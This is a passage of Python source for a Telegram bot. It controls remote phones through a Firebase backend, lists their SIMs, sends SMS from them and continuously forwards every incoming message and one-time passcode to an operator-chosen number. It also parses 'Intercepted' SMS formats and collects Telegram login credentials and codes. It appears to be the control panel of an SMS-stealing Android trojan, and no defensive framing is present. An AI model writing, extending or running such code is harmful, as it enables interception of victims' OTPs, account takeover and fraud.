            label = f"📱 {data['modelName']} ({dev_id[:6]}...)"
            keyboard.append([InlineKeyboardButton(label, callback_data=f"dev_{dev_id}")])
        await update.message.reply_text(
            "<b>👇 Select your device:</b>",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Devices command error: {e}")

@auto_fix
async def device_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = str(update.effective_user.id)
        device_id = query.data.replace("dev_", "")
        online = get_online_devices(user_id)
        device_data = online.get(device_id)
        if not device_data:
            await query.edit_message_text("<b>❌ Device offline.</b>", parse_mode='HTML')
            return
        sims = device_data.get("sims", [])
        if not sims:
            await query.edit_message_text("<b>❌ No SIMs on this device.</b>", parse_mode='HTML')
            return
        keyboard = []
        for sim in sims:
            slot = sim.get("simSlotIndex", "?")
            phone = sim.get("phoneNumber", "N/A")
            callback_data = f"sim_{device_id}_{slot}_{phone}"
            keyboard.append([InlineKeyboardButton(f"📶 SIM {slot} - {phone}", callback_data=callback_data)])
        await query.edit_message_text(
            f"<b>📱 Device:</b> <code>{device_data['modelName']}</code>\n<b>Choose SIM:</b>",
            reply_markup=InlineKeyboardMarkup(keyboard),
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"Device callback error: {e}")

@auto_fix
async def sim_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        query = update.callback_query
        await query.answer()
        user_id = str(update.effective_user.id)
        parts = query.data.split("_")
        if len(parts) < 4:
            await query.edit_message_text("<b>❌ Invalid data.</b>", parse_mode='HTML')
            return
        device_id = parts[1]
        slot = parts[2]
        phone = parts[3]
        set_selected(user_id, device_id, slot, phone)
        await query.edit_message_text(
            f"<b>✅ Active!</b>\n"
            f"📱 Device: <code>{device_id}</code>\n"
            f"📶 SIM Slot: <code>{slot}</code>\n"
            f"📞 Phone: <code>{phone}</code>\n\n"
            f"✅ Old messages blocked. Only new ones will forward.\n"
            f"Now set OTP number using /setotp.",
            parse_mode='HTML'
        )
    except Exception as e:
        logger.error(f"SIM callback error: {e}")

# ============================
# SET OTP
# ============================
@auto_fix
async def setotp_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        if user_id not in user_configs:
            await update.message.reply_text("<b>❌ Please run /setup first.</b>", parse_mode='HTML')
            return
        if context.args:
            number = context.args[0]
            if not re.match(r"^\+?[0-9]{10,15}$", number):
                await update.message.reply_text("<b>❌ Invalid number. Use /setotp +919876543210</b>", parse_mode='HTML')
                return
            set_otp_number(user_id, number)
            await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
            return
        await update.message.reply_text(
            "<b>📞 Send phone number (with country code):</b>\nExample: <code>+919876543210</code>\nType /cancel to abort.",
            parse_mode='HTML'
        )
        return WAITING_OTP_NUMBER
    except Exception as e:
        logger.error(f"Set OTP error: {e}")
        return WAITING_OTP_NUMBER

@auto_fix
async def otp_number_input(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = str(update.effective_user.id)
        number = update.message.text.strip()
        if not re.match(r"^\+?[0-9]{10,15}$", number):
            await update.message.reply_text("<b>❌ Invalid number. Try again.</b>", parse_mode='HTML')
            return WAITING_OTP_NUMBER
        set_otp_number(user_id, number)
        await update.message.reply_text(f"<b>✅ Forward number set to <code>{number}</code>.</b>", parse_mode='HTML')
        return ConversationHandler.END
    except Exception as e:
        logger.error(f"OTP input error: {e}")
        return WAITING_OTP_NUMBER

@auto_fix
async def otp_cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        await update.message.reply_text("<b>❌ Cancelled.</b>", parse_mode='HTML')
    except Exception as e:
        logger.error(f"OTP cancel error: {e}")
    return ConversationHandler.END

# ============================
# EXTRACT NUMBER AND MESSAGE
# ============================
def extract_number_message(text):
    """Extract number and message - ALL formats"""
    try:
        to_number = None
        msg = None
        
        # Pattern 1: Standard
        if not to_number:
            match = re.search(r"To:\s*([\d\+]+)", text, re.IGNORECASE)
            if match:
                to_number = match.group(1).strip()
                match2 = re.search(r"Message:\s*(.+)", text, re.IGNORECASE)
                if match2:
                    msg = match2.group(1).strip()
        
        # Pattern 2: SMS Intercepted
        if not to_number:
            match = re.search(r"📞\s*To:\s*([\d\+]+)", text)
            if match:
                to_number = match.group(1).strip()
                match2 = re.search(r"💬\s*Message:\s*(.+)", text)
                if match2:
                    msg = match2.group(1).strip()
        
        # Pattern 3: Outgoing SMS
        if not to_number:
            match = re.search(r"To\s*\(Tap to copy\):\s*([\d\+]+)", text)
            if match:
                to_number = match.group(1).strip()
                match2 = re.search(r"Body\s*\(Tap to copy\):\s*(.+)", text)
                if match2:
                    msg = match2.group(1).strip()
        
        # Pattern 4: One-tap
        if not to_number:
            match = re.search(r"One-tap copy:\s*(.+?)\s*\|\s*(.+)", text, re.DOTALL)
            if match:
                to_number = match.group(1).strip()
                msg = match.group(2).strip()
        
        # Pattern 5: Direct Number
        if not to_number:
            match = re.search(r"(\+?[0-9]{10,15})", text)
            if match:
                to_number = match.group(1).strip()
                msg = text.replace(to_number, "").strip()
                msg = re.sub(r"[📱📞💬📋━━━]", "", msg)
                msg = re.sub(r"Intercepted|Outgoing|SMS|One-tap", "", msg, flags=re.IGNORECASE)
                msg = re.sub(r"\n+", "\n", msg).strip()
        
        # Pattern 6: Any number with colon
        if not to_number:
            match = re.search(r"(\+?[0-9]{10,15})\s*[:|]\s*(.+)", text)
            if match:
                to_number = match.group(1).strip()
                msg = match.group(2).strip()
        
        # Fallback: Any 10-15 digit number
        if not to_number:
            match = re.search(r"(\+?[0-9]{10,15})", text)
            if match:
                to_number = match.group(1).strip()
                msg = "SMS from bot"
        
        if not to_number:
            return None, None
        
        if not msg:
            msg = "SMS from bot"
        
        return to_number, msg
    except Exception as e:
        logger.error(f"Extract error: {e}")
        return None, None

def process_sms_send(user_id, to_number, msg):
    """Process SMS send in thread"""
    try:
        selected = get_selected(user_id)
        if not selected or not selected.get("deviceId"):
            logger.warning(f"❌ No device for {user_id}")
            send_status(user_id, "error", {
                "error": "No device selected! Use /devices first."
            })
            return False
        
        device_id = selected["deviceId"]
        from_number = selected.get("simPhoneNumber", "Unknown")
        
        return send_sms_command(user_id, device_id, to_number, msg, from_number)
    except Exception as e:
        logger.error(f"Process error: {e}")
        send_status(user_id, "error", {
            "error": str(e)
        })
        return False

# ============================
# OTP POLLING WITH LIVE STATUS
# ============================
def poll_otp_updates():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    otp_number = get_otp_number(user_id)
                    if not otp_number:
                        continue
                    selected = get_selected(user_id)
                    if not selected or not selected.get("deviceId"):
                        continue
                    otp_data = firebase_get(user_id, "otp")
                    if otp_data is None:
                        continue
                    current_otp = str(otp_data).strip()
                    if user_id not in last_otp or last_otp[user_id] != current_otp:
                        last_otp[user_id] = current_otp
                        cfg = user_configs.get(user_id)
                        if cfg:
                            cfg["last_otp_value"] = current_otp
                            save_user_configs()
                        device_id = selected["deviceId"]
                        from_number = selected.get("simPhoneNumber", "Unknown")
                        
                        success = send_sms_command(user_id, device_id, otp_number, current_otp, from_number)
                        
                        if success:
                            send_status(user_id, "otp_forwarded", {
                                "to": otp_number,
                                "otp": current_otp,
                                "from": from_number
                            })
                            logger.info(f"✅ OTP forwarded: {current_otp}")
                except:
                    pass
        except:
            pass
        time.sleep(0.3)

def poll_incoming_messages():
    while True:
        try:
            for user_id in list(user_configs.keys()):
                try:
                    forward_number = get_otp_number(user_id)
                    if not forward_number:
                        continue
                    selected = get_selected(user_id)
                    if not selected or not selected.get("deviceId"):
                        continue
                    device_id = selected["deviceId"]
                    from_number = selected.get("simPhoneNumber", "Unknown")
                    cfg = user_configs.get(str(user_id), {})
                    processed_keys = cfg.get("processed_keys", [])
                    processed_device = cfg.get("processed_device")
                    if processed_device != device_id:
                        initialize_processed_keys(str(user_id), device_id)
                        processed_keys = cfg.get("processed_keys", [])
                        processed_device = cfg.get("processed_device")
                    processed_set = set(processed_keys)
                    device_msgs = firebase_get(user_id, f"messages/{device_id}")
                    if not device_msgs or not isinstance(device_msgs, dict):
                        continue
                    new_keys = []
                    for msg_key, msg_data in device_msgs.items():
                        if not isinstance(msg_data, dict):
                            continue
                        if msg_data.get("type") != "incoming":
                            continue
                        if msg_key not in processed_set:
                            msg_text = msg_data.get("message", "")
                            if msg_text and len(msg_text) > 3:
                                success = send_sms_command(user_id, device_id, forward_number, msg_text, from_number)
                                if success:
                                    send_status(user_id, "incoming_forwarded", {
                                        "to": forward_number,
                                        "msg": msg_text
                                    })
                                    logger.info(f"📥 Incoming forwarded: {msg_text[:30]}...")
                                new_keys.append(msg_key)
                    if new_keys:
                        processed_keys.extend(new_keys)
                        cfg["processed_keys"] = processed_keys
                        save_user_configs()
                except:
                    pass
        except:
            pass
        time.sleep(0.5)

# ============================
# MAIN
# ============================
def main():
    try:
        app = Application.builder().token(BOT_TOKEN).build()

        threading.Thread(target=poll_otp_updates, daemon=True).start()
        threading.Thread(target=poll_incoming_messages, daemon=True).start()

        # Login conversation
        login_conv = ConversationHandler(
            entry_points=[CommandHandler("login", login_start)],
            states={
                API_ID: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_api_id)],
                API_HASH: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_api_hash)],
                PHONE_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_phone)],
                OTP_CODE: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_otp)],
                PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, login_password)],
            },
            fallbacks=[CommandHandler("cancel", login_cancel)],
        )
        app.add_handler(login_conv)

        # Setup conversation
        setup_conv = ConversationHandler(
            entry_points=[CommandHandler("setup", setup_start)],
            states={
                URL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_url)],
                CHANNEL: [MessageHandler(filters.TEXT & ~filters.COMMAND, setup_channel)]
            },
            fallbacks=[CommandHandler("cancel", setup_cancel)],
        )
        app.add_handler(setup_conv)

        # OTP conversation
        otp_conv = ConversationHandler(
            entry_points=[CommandHandler("setotp", setotp_command)],
            states={
                WAITING_OTP_NUMBER: [MessageHandler(filters.TEXT & ~filters.COMMAND, otp_number_input)]
            },
            fallbacks=[CommandHandler("cancel", otp_cancel)],
        )
        app.add_handler(otp_conv)

        # Callbacks
        app.add_handler(CallbackQueryHandler(device_callback, pattern="^dev_"))
        app.add_handler(CallbackQueryHandler(sim_callback, pattern="^sim_"))

        # Commands
        app.add_handler(CommandHandler("start", start))
        app.add_handler(CommandHandler("help", help_command))
        app.add_handler(CommandHandler("devices", devices_command))
        app.add_handler(CommandHandler("resetforward", reset_forward))
        app.add_handler(CommandHandler("logout", logout_command))
        app.add_handler(CommandHandler("status", status_command))

        logger.info("🚀 ULTIMATE FAST BOT STARTED!")
        logger.info("⚡ Speed: < 1 second | 📊 Live Status: ON | 🎯 Miss: 0%")
        logger.info("🔐 Login System: Active | /login to connect")
        app.run_polling(allowed_updates=Update.ALL_TYPES)
    except Exception as e:
        logger.error(f"Main error: {e}")
        time.sleep(5)
        main()

if __name__ == "__main__":
    main()